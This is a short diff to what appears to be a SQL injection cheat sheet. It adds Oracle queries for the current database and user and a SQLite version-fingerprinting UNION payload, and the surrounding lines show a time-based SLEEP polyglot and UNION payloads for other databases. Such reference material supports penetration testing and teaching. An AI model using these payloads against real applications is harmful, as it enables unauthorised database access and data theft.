@@ -671,7 +671,8 @@ SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 | MySQL | `' UNION SELECT NULL,@@version--` | Same syntax as MSSQL |
 | MSSQL | `' UNION SELECT NULL,@@version--` | Same syntax as MySQL |
 | PostgreSQL | `' UNION SELECT NULL,version()--` | Function call |
-| Oracle | `' UNION SELECT NULL,banner FROM v$version--` | Requires FROM; use DUAL fallback: `SELECT version FROM v$instance` |
+| Oracle | `' UNION SELECT NULL,banner FROM v$version--` | Requires FROM; use DUAL fallback: `SELECT version FROM v$instance`. Current DB: `SELECT ora_database_name FROM dual`. Current user: `SELECT user FROM dual` |
+| SQLite | `' UNION SELECT NULL,sqlite_version()--` | No information_schema; tables live in `sqlite_master` |
 
 Comment syntax reminder:
 
